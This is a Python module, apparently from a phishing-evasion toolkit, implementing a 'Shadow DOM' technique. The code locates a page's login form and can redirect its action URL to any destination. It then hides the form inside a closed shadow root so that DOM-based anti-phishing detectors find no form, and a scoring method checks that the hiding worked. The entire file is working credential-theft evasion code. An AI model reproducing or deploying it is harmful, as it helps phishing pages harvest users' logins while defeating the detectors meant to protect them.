from __future__ import annotations

import base64
from typing import Any, ClassVar

from app.techniques.base import (
    ApplyResult, BaseTechnique, Category, OptionSpec, Requirement, TechniqueGroup,
)
from app.utils.html_utils import (
    count_real_logins, find_login_form, parse_html, serialize_html,
)
from app.utils.js_templates import SHADOW_DOM_TEMPLATE


class ShadowDomTechnique(BaseTechnique):
    """
    T11 — Shadow DOM / Web Components encapsulation.

    Moves all <form> elements (and optionally other content) into a closed
    shadow root, making them invisible to standard DOM queries. Anti-phishing
    tools that inspect document.querySelectorAll('form') find nothing.
    """

    TECHNIQUE_ID: ClassVar[int] = 11
    TECHNIQUE_NAME: ClassVar[str] = "Shadow DOM / Web Components Encapsulation"
    GROUP: ClassVar[TechniqueGroup] = TechniqueGroup.HTML_DOM_JS
    CATEGORIES: ClassVar[list[Category]] = [Category.CREDENTIAL_THEFT]
    REQUIREMENTS: ClassVar[list[Requirement]] = [Requirement.HAS_INPUT_FIELDS]
    DESCRIPTION: ClassVar[str] = (
        "Moves form elements into a closed shadow root. "
        "Standard DOM queries (querySelectorAll('form')) return empty results, "
        "defeating DOM-based phishing detectors."
    )
    OPTION_SPECS: ClassVar[list[OptionSpec]] = [
        OptionSpec(
            name="only_login_form",
            description="Only move the detected login form (recommended)",
            type=bool,
            default=True,
        ),
        OptionSpec(
            name="action_url",
            description="Override the form action= to this URL inside the shadow root (blank = keep)",
            type=str,
            default="",
        ),
        OptionSpec(
            name="wrap_orphan_password",
            description="If a password input has no <form>, wrap it in a synthetic form",
            type=bool,
            default=True,
        ),
    ]

    def apply(
        self,
        html: str,
        url: str,
        options: dict[str, Any],
        screenshot_bytes: bytes | None = None,
    ) -> ApplyResult:
        only_login: bool = bool(options.get("only_login_form", True))
        action_url: str = options.get("action_url", "") or ""
        wrap_orphan: bool = bool(options.get("wrap_orphan_password", True))

        soup = parse_html(html)
        all_forms = soup.find_all("form")
        password_form_count = count_real_logins(soup)
        synthetic_built = False

        if only_login:
            login_form, picker = find_login_form(soup)
            if login_form is None:
                orphan_pw = soup.find("input", attrs={"type": "password"})
                if orphan_pw and wrap_orphan:
                    parent = orphan_pw.parent or soup.find("body") or soup
                    new_form = soup.new_tag("form", method="post")
                    for inp in parent.find_all(
                        "input",
                        attrs={"type": ["text", "email", "password", "tel"]},
                        recursive=False,
                    ):
                        new_form.append(inp.extract())
                    if not new_form.find("input", attrs={"type": "password"}):
                        new_form.append(orphan_pw.extract())
                    parent.append(new_form)
                    forms = [new_form]
                    synthetic_built = True
                    picker = "synthetic_orphan"
                else:
                    self.log("info", "shadow_dom_skip",
                             reason="no_login_form", forms=len(all_forms))
                    return ApplyResult(
                        modified_html=None, modified_url=None, extra_files={},
                        change_log=[self._make_change(
                            "shadow_dom_skipped",
                            "No login form found and no orphan password input",
                            details={
                                "reason": "no_login_form",
                                "forms_total": len(all_forms),
                                "password_forms": password_form_count,
                            },
                        )],
                    )
            else:
                forms = [login_form]
            self.log("info", "shadow_dom_picker", picker=picker)
        else:
            if not all_forms:
                self.log("info", "shadow_dom_skip", reason="no_forms")
                return ApplyResult(
                    modified_html=None, modified_url=None, extra_files={},
                    change_log=[self._make_change(
                        "shadow_dom_skipped", "No <form> elements found",
                        details={"reason": "no_forms"},
                    )],
                )
            forms = all_forms
            picker = "all_forms"

        if action_url:
            for f in forms:
                f["action"] = action_url
                f["method"] = (f.get("method") or "post").lower()

        form_html = "".join(str(f) for f in forms)
        b64_content = base64.b64encode(form_html.encode("utf-8")).decode("ascii")

        for form in forms:
            form.decompose()

        body = soup.find("body")
        if body is None:
            body = soup.new_tag("body")
            html_tag = soup.find("html")
            if html_tag:
                html_tag.append(body)
            else:
                soup.append(body)

        host_div = soup.new_tag(
            "div", id="__shadow_host__",
            style="display:block;"
        )
        body.insert(0, host_div)

        head = soup.find("head")
        if not head:
            head = soup.new_tag("head")
            html_tag = soup.find("html")
            if html_tag:
                html_tag.insert(0, head)
            else:
                soup.insert(0, head)

        script = soup.new_tag("script")
        script.string = SHADOW_DOM_TEMPLATE.format(b64_content=b64_content)
        head.append(script)

        self.log("info", "shadow_dom_applied",
                 forms_moved=len(forms), synthetic=synthetic_built,
                 action_overridden=bool(action_url))

        return ApplyResult(
            modified_html=serialize_html(soup),
            modified_url=None,
            extra_files={},
            change_log=[
                self._make_change(
                    "shadow_dom_encapsulation",
                    f"Moved {len(forms)} form(s) into closed shadow root",
                    before=f"{len(forms)} forms in main DOM",
                    after="Forms hidden in shadow root; DOM query returns empty",
                    details={
                        "picker": picker,
                        "forms_moved": len(forms),
                        "forms_total": len(all_forms),
                        "password_forms": password_form_count,
                        "synthetic_form_built": synthetic_built,
                        "action_overridden": bool(action_url),
                    },
                )
            ],
        )

    def evaluate(self, html, url, change_log, extra_files):
        from app.techniques.base import EvaluationResult
        signals, issues = [], []

        has_shadow = html and "attachShadow" in html
        if has_shadow:
            signals.append("HTML contains attachShadow() — shadow root wiring present")
        else:
            issues.append("HTML missing attachShadow() — shadow root may not be set up")

        has_host = html and "__shadow_host__" in html
        if has_host:
            signals.append("HTML has #__shadow_host__ container div")
        else:
            issues.append("HTML missing #__shadow_host__ div")

        form_in_dom = False
        if html:
            from app.utils.html_utils import parse_html
            soup = parse_html(html)
            visible_forms = [
                f for f in soup.find_all("form")
                if f.get("id") != "__shadow_host__"
            ]
            if not visible_forms:
                signals.append("No <form> found in static DOM — forms will be in shadow root")
            else:
                form_in_dom = True
                signals.append(f"{len(visible_forms)} form(s) in static DOM (will be moved to shadow root at runtime)")

        entry = next((e for e in change_log if e.change_type == "shadow_dom_encapsulation"), None)
        if entry:
            moved = entry.details.get("forms_moved", 0)
            if moved >= 1:
                signals.append(f"change_log: {moved} form(s) moved to shadow root")
            else:
                issues.append("change_log shows 0 forms moved")
        else:
            issues.append("No shadow_dom_encapsulation in change_log (supplementary check)")

        passed = bool(has_shadow and has_host)
        return EvaluationResult(
            passed=passed,
            score=self._eval_score(signals, issues),
            signals=signals,
            issues=issues,
            details={"has_attach_shadow": has_shadow, "has_host_div": has_host, "form_in_static_dom": form_in_dom},
        )
